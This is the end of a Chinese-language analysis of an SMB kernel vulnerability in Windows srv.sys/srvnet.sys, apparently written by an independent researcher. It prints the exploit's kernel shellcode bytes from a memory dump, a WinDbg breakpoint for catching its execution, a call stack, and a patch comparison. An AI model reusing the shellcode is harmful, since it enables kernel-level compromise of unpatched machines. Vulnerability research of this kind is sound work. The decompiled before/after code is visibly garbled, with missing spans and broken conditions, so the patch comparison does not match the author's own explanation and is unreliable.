    ffdff120  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff130  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff140  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff150  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff160  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff170  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff180  00 00 00 00 00 00 00 00-00 00 00 00 90 f1 df ff  ................
    ffdff190  00 00 00 00 f0 f1 df ff-00 00 00 00 00 00 00 00  ................
    ffdff1a0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff1b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff1c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff1d0  00 00 00 00 00 00 00 00-f0 01 d0 ff ff ff ff ff  ................
    ffdff1e0  00 00 00 00 00 00 00 00-00 02 d0 ff ff ff ff ff  ................
    ffdff1f0  00 31 c0 40 90 74 08 e8-09 00 00 00 c2 24 00 e8  .1.@.t.......$..
    ffdff200  a7 00 00 00 c3 e8 01 00-00 00 eb 90 5b b9 76 01  ............[.v.
    ffdff210  00 00 0f 32 a3 fc ff df-ff 8d 43 17 31 d2 0f 30  ...2......C.1..0
    ffdff220  c3 b9 23 00 00 00 6a 30-0f a1 8e d9 8e c1 64 8b  ..#...j0......d.
    ffdff230  0d 40 00 00 00 8b 61 04-ff 35 fc ff df ff 60 9c  .@....a..5....`.
    ffdff240  6a 23 52 9c 6a 02 83 c2-08 9d 80 4c 24 01 02 6a  j#R.j......L$..j
    ffdff250  1b ff 35 04 03 df ff 6a-00 55 53 56 57 64 8b 1d  ..5....j.USVWd..
    ffdff260  1c 00 00 00 6a 3b 8b b3-24 01 00 00 ff 33 31 c0  ....j;..$....31.
    ffdff270  48 89 03 8b 6e 28 6a 01-83 ec 48 81 ed 9c 02 00  H...n(j...H.....
    ffdff280  00 a1 fc ff df ff b9 76-01 00 00 31 d2 0f 30 fb  .......v...1..0.
    ffdff290  e8 11 00 00 00 fa 64 8b-0d 40 00 00 00 8b 61 04  ......d..@....a.
    ffdff2a0  83 ec 28 9d 61 c3 e9 ef-00 00 00 b9 82 00 00 c0  ..(.a...........
    ffdff2b0  0f 32 48 bb f8 0f d0 ff-ff ff ff ff 89 53 04 89  .2H..........S..
    ffdff2c0  03 48 8d 05 0a 00 00 00-48 89 c2 48 c1 ea 20 0f  .H......H..H.. .
0xffdff1f1处为shellcode.最后在接收完成后，最终调到srvnet!SrvNetWskReceiveComplete.在这个函数中会调用最终的shellcode。可以这么下断点:
    srvnet!SrvNetWskReceiveComplete:
    986e9569 8bff            mov     edi,edi
    986e956b 55              push    ebp
    986e956c 8bec            mov     ebp,esp
    986e956e 8b450c          mov     eax,dword ptr [ebp+0Ch]
    986e9571 8b4818          mov     ecx,dword ptr [eax+18h]
    986e9574 53              push    ebx
    986e9575 8b581c          mov     ebx,dword ptr [eax+1Ch]
    986e9578 56              push    esi
    986e9579 8b7510          mov     esi,dword ptr [ebp+10h]
    986e957c 57              push    edi
    986e957d 8b7e24          mov     edi,dword ptr [esi+24h]
    986e9580 50              push    eax
    986e9581 894d0c          mov     dword ptr [ebp+0Ch],ecx
    986e9584 c6451300        mov     byte ptr [ebp+13h],0
    986e9588 ff1518106f98    call    dword ptr [srvnet!_imp__IoFreeIrp (986f1018)]
    986e958e 33c0            xor     eax,eax
    986e9590 39450c          cmp     dword ptr [ebp+0Ch],eax
    986e9593 7553            jne     srvnet!SrvNetWskReceiveComplete+0x7f (986e95e8)
    kd> .reload srvnet.sys
    kd> ba e1 srvnet!SrvNetWskReceiveComplete+0x13 ".if(poi(esi+0x24) == ffdff020) {} .else {gc}"
最终调用到shellcode的调用栈为：
     # ChildEBP RetAddr  Args to Child              
    WARNING: Frame IP not in any known module. Following frames may be wrong.
    00 83f6c2e0 986ea290 00000000 00000000 00000420 0xffdff1f1
    01 83f6c330 986e8204 ffdff020 00001068 00001068 srvnet!SrvNetCommonReceiveHandler+0x94 (FPO: [Non-Fpo])
    02 83f6c370 986e95db ffdff020 00000001 870cb26b srvnet!SrvNetIndicateData+0x73 (FPO: [Non-Fpo])
    03 83f6c38c 83ebaf83 00000000 02000000 019bd010 srvnet!SrvNetWskReceiveComplete+0x72 (FPO: [Non-Fpo])
    04 83f6c3d0 8998db8c 865fd020 83f6c454 89661c8a nt!IopfCompleteRequest+0x128
    05 83f6c3dc 89661c8a 870cb1f8 00000000 00001068 afd!WskProTLReceiveComplete+0x5e (FPO: [Non-Fpo])
    06 83f6c454 8964d839 865fd020 00000000 8841a608 tcpip!TcpCompleteClientReceiveRequest+0x1c (FPO: [Non-Fpo])
    07 83f6c4c0 8964d8be 8841a608 8841a700 00000000 tcpip!TcpFlushTcbDelivery+0x1f6 (FPO: [Non-Fpo])
    08 83f6c4dc 8965af7f 8841a608 00000000 83f6c5d0 tcpip!TcpFlushRequestReceive+0x1c (FPO: [Non-Fpo])
    09 83f6c518 8965ae47 8841a608 8841a608 83f6c5a8 tcpip!TcpDeliverFinToClient+0x37 (FPO: [Non-Fpo])
    0a 83f6c528 896abfc1 8841a608 83f6c688 8841a608 tcpip!TcpAllowFin+0x86 (FPO: [Non-Fpo])
    0b 83f6c5a8 896aa5a5 86f8c078 8841a608 83f6c5d0 tcpip!TcpTcbCarefulDatagram+0x16f2 (FPO: [Non-Fpo])
    0c 83f6c614 8968da38 86f8c078 8841a608 00f6c688 tcpip!TcpTcbReceive+0x22d (FPO: [Non-Fpo])
    0d 83f6c67c 8968e23a 8656b9b8 86f9657c 86f965f0 tcpip!TcpMatchReceive+0x237 (FPO: [Non-Fpo])
    0e 83f6c6cc 8965dd90 86f8c078 86f9600c 00003d08 tcpip!TcpPreValidatedReceive+0x263 (FPO: [Non-Fpo])
    0f 83f6c6e0 89693396 83f6c6fc 00000011 86f96008 tcpip!TcpNlClientReceivePreValidatedDatagrams+0x15 (FPO: [Non-Fpo])
    10 83f6c704 896938dd 83f6c710 00000000 00000011 tcpip!IppDeliverPreValidatedListToProtocol+0x33 (FPO: [Non-Fpo])
    11 83f6c7a0 89698a7b 8665d918 00000000 83f79480 tcpip!IpFlcReceivePreValidatedPackets+0x479 (FPO: [Non-Fpo])
    12 83f6c7c8 83ecbb95 00000000 ee2bb116 865bab48 tcpip!FlReceiveNetBufferListChainCalloutRoutine+0xfc (FPO: [Non-Fpo])
    13 83f6c830 89698c0b 8969897f 83f6c858 00000000 nt!KeExpandKernelStackAndCalloutEx+0x132
    14 83f6c86c 8951f18d 8665d002 87773900 00000000 tcpip!FlReceiveNetBufferListChain+0x7c (FPO: [Non-Fpo])
    15 83f6c8a4 8950d5be 8665eaa8 87773988 00000000 ndis!ndisMIndicateNetBufferListsToOpen+0x188 (FPO: [Non-Fpo])
    16 83f6c8cc 8950d4b2 00000000 87773988 871650e0 ndis!ndisIndicateSortedNetBufferLists+0x4a (FPO: [Non-Fpo])
    17 83f6ca48 894b8c1d 871650e0 00000000 00000000 ndis!ndisMDispatchReceiveNetBufferLists+0x129 (FPO: [Non-Fpo])
    18 83f6ca64 8950d553 871650e0 87773988 00000000 ndis!ndisMTopReceiveNetBufferLists+0x2d (FPO: [Non-Fpo])
    19 83f6ca8c 894b8c78 871650e0 87773988 00000000 ndis!ndisMIndicateReceiveNetBufferListsInternal+0x62 (FPO: [Non-Fpo])
    1a 83f6cab4 903ab7f4 871650e0 87773988 00000000 ndis!NdisMIndicateReceiveNetBufferLists+0x52 (FPO: [Non-Fpo])
    1b 83f6cafc 903aa77e 00000000 87792660 00000001 E1G60I32!RxProcessReceiveInterrupts+0x108 (FPO: [Non-Fpo])
    1c 83f6cb14 8950d89a 011e9138 00000000 83f6cb40 E1G60I32!E1000HandleInterrupt+0x80 (FPO: [Non-Fpo])
    1d 83f6cb50 894b8a0f 87792674 00792660 00000000 ndis!ndisMiniportDpc+0xe2 (FPO: [Non-Fpo])
    1e 83f6cb78 83eba696 87792674 87792660 00000000 ndis!ndisInterruptDpc+0xaf (FPO: [Non-Fpo])
    1f 83f6cbd4 83eba4f8 83f6fe20 83f79480 00000000 nt!KiExecuteAllDpcs+0xfa
    20 83f6cc20 83eba318 00000000 0000000e 00000000 nt!KiRetireDpcList+0xd5
    21 83f6cc24 00000000 0000000e 00000000 00000000 nt!KiIdleLoop+0x38 (FPO: [0,0,0])
**关于补丁**
微软在补丁中并没有补掉漏洞的代码而是在上层过滤了触发漏洞的一个Type。
补丁修补的逻辑在srv!ExecuteTransaction
修补前：
    int __thiscall ExecuteTransaction(int this)
    {
        //略...
        if ( *(_DWORD *)(v3 + 0x50) >= 1u && v10 Flags) >= 2u
            && WPP_GLOBAL_Control->Characteristics & 1
            && KeGetCurrentIrql() AttachedDevice, WPP_GLOBAL_Control->CurrentIrp);
          }
          goto LABEL_104;
        }
        //goto error
        //略...
    }
修复后：
    int __thiscall ExecuteTransaction(int this)
    {
       //略...
       if ( *(_DWORD *)(v3 + 0x50) Flags) >= 2u
            && WPP_GLOBAL_Control->Characteristics & 1
            && KeGetCurrentIrql() AttachedDevice, WPP_GLOBAL_Control->CurrentIrp);
          }
          goto LABEL_108;
        }
        //goto error
        //略...
    }
修补的方法就是将修补*(WORD*)v6 ==> *(DWORD*)v6; 还有就是*(_DWORD *)(v3 + 0x50) >= 1 变成了
*(_DWORD *)(v3 + 0x50) >= 2u 笔者在调试的时候发现触发漏洞的正好是1。
由于作者水平有限，有什么错误欢迎大家指出
联系作者：[ **pgboy1988**](http://weibo.com/pgboy1988)